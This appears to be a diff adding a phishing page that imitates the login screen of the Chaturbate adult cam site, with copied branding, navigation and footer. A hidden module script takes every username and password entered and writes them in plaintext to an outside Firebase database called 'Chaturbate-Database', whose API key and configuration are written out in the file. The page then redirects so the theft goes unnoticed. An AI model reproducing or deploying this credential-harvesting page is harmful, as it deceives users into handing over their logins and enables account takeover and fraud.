@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Chaturbate Login</title>
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <header>
+    <div class="logo">
+      <img src="logo500.jpg" alt="Chaturbate Logo">
+    </div>
+    <nav>
+      <ul>
+        <li><a href="../index.html">Home</a></li>
+        <li><a href="../index.html">Discover</a></li>
+        <li><a href="../index.html">Tags</a></li>
+        <li><a href="../index.html">Private Shows</a></li>
+        <li><a href="../index.html">Following (0/0)</a></li>
+      </ul>
+    </nav>
+    <div class="auth-buttons">
+      <button onclick="redirectToSignUp()">Sign Up</button>
+
+<script>
+function redirectToSignUp() {
+    window.location.href = "../SignUp/index.html";
+}
+</script>
+
+<button onclick="redirectSignUp()">Broadcast Yourself </button>
+
+<script>
+function redirectToSignUp() {
+    window.location.href = "../SignUp/index.html";
+}
+</script>
+
+    </div>
+  </header>
+
+  <main>
+    <div class="login-container">
+      <h1>Chaturbate Login</h1>
+      <form id="loginForm" onsubmit="handleLogin(event)">
+        <label for="username">Username: *</label>
+        <input type="text" id="username" name="username" required>
+        
+        <label for="password">Password: *</label>
+        <input type="password" id="password" name="password" required>
+        
+        <div class="keep-logged-in">
+          <input type="checkbox" id="keep-logged-in" name="keep-logged-in">
+          <label for="keep-logged-in">Keep me logged in:</label>
+        </div>
+        
+        <button type="submit">Log In</button>
+      </form>
+    
+      <script>
+        function handleLogin(event) {
+          event.preventDefault(); // Prevent the default form submission
+    
+          // Retrieve the form data (optional, for validation or processing)
+          const username = document.getElementById("username").value;
+          const password = document.getElementById("password").value;
+    
+          // You can add login validation logic here if needed
+          if (username && password) {
+            // Redirect to the main page
+            window.location.href = "../index.html"; // Replace "main.html" with your desired main page URL
+          } else {
+            alert("Please fill in both username and password fields.");
+          }
+        }
+      </script>
+      <div class="login-links">
+        <a href="../SignUp/index.html">Create Free Account</a>
+        <a href="#">Forgot password?</a>
+      </div>
+    </div>
+
+    <footer>
+      <div class="footer-links">
+        <div>
+          <h3>Free Cams by Age</h3>
+          <ul>
+            <li>Teen Cams (18+)</li>
+            <li>18 to 21 Cams</li>
+            <li>20 to 30 Cams</li>
+            <li>30 to 50 Cams</li>
+            <li>Mature Cams (50+)</li>
+          </ul>
+        </div>
+        <div>
+          <h3>Free Cams by Region</h3>
+          <ul>
+            <li>North American Cams</li>
+            <li>Other Region Cams</li>
+            <li>Euro Russian Cams</li>
+            <li>Asian Cams</li>
+            <li>South American Cams</li>
+          </ul>
+        </div>
+        <div>
+          <h3>Available Private Shows</h3>
+          <ul>
+            <li>6 Tokens per Minute</li>
+            <li>12-18 Tokens per Minute</li>
+            <li>30-42 Tokens per Minute</li>
+            <li>60-72 Tokens per Minute</li>
+            <li>90+ Tokens per Minute</li>
+          </ul>
+        </div>
+      </div>
+    </footer>
+  </main>
+  <script type="module">
+    // Import Firebase SDKs
+    import { initializeApp } from 'https://www.gstatic.com/firebasejs/9.10.0/firebase-app.js';
+    import { getDatabase, ref, push, set } from 'https://www.gstatic.com/firebasejs/9.10.0/firebase-database.js';
+    import { getAuth, createUserWithEmailAndPassword } from 'https://www.gstatic.com/firebasejs/9.10.0/firebase-auth.js';
+
+    // Your web app's Firebase configuration
+    const firebaseConfig = {
+        apiKey: "AIzaSyBKgtbD-rpsPzMVP5gSOvq6XlGkpgYzBuU",
+        authDomain: "chaturbate-92e09.firebaseapp.com",
+        databaseURL: "https://chaturbate-92e09-default-rtdb.firebaseio.com",
+        projectId: "chaturbate-92e09",
+        storageBucket: "chaturbate-92e09.firebasestorage.app",
+        messagingSenderId: "529947122163",
+        appId: "1:529947122163:web:0dfafe50cd834942035a86",
+        measurementId: "G-STGV4GZB0C"
+    };
+
+    // Initialize Firebase
+    const app = initializeApp(firebaseConfig);
+    const database = getDatabase(app);
+    const auth = getAuth(app);
+
+    // Set up references
+    const ChaturbateDb = ref(database, 'Chaturbate-Database');
+
+    // Form Submission
+    document.getElementById('loginForm').addEventListener('submit', submitForm);
+
+    function submitForm(e) {
+        e.preventDefault();
+
+        // Get username and password from form
+        const username = getElementVal('username');
+        const password = getElementVal('password');
+        
+        saveMessages(username, password);
+
+        // Show success alert
+        document.querySelector("#alert").style.display = "block";
+        setTimeout(() => {
+            document.querySelector("#alert").style.display = "none";
+        }, 3000);
+
+        // Reset the form
+        document.getElementById("loginForm").reset();
+    }
+
+    // Save data to Firebase
+    const saveMessages = (username, password) => {
+        const newLoginForm = push(ChaturbateDb);
+        set(newLoginForm, {
+            username: username,
+            password: password
+        });
+    };
+
+    // Get element value
+    const getElementVal = (id) => {
+        return document.getElementById(id).value;
+    };
+
+    // Create account on button click
+    const submitButton = document.getElementById('createAccountButton');
+    submitButton.addEventListener("click", function(event) {
+        event.preventDefault();
+
+        const username = getElementVal('username');
+        const password = getElementVal('password');
+        
+        // Create user with email and password
+        createUserWithEmailAndPassword(auth, username, password)
+            .then((userCredential) => {
+                const user = userCredential.user;
+                alert("Logged In");
+                window.location.href = "../Login/index.html";
+            })
+            .catch((error) => {
+                const errorMessage = error.message;
+                alert(`Error: ${errorMessage}`);
+            });
+    });
+</script>
+
+<!-- Firebase SDK -->
+<script src="https://www.gstatic.com/firebasejs/9.10.0/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.10.0/firebase-database.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.10.0/firebase-auth.js"></script>
+
+</body>
+</html>
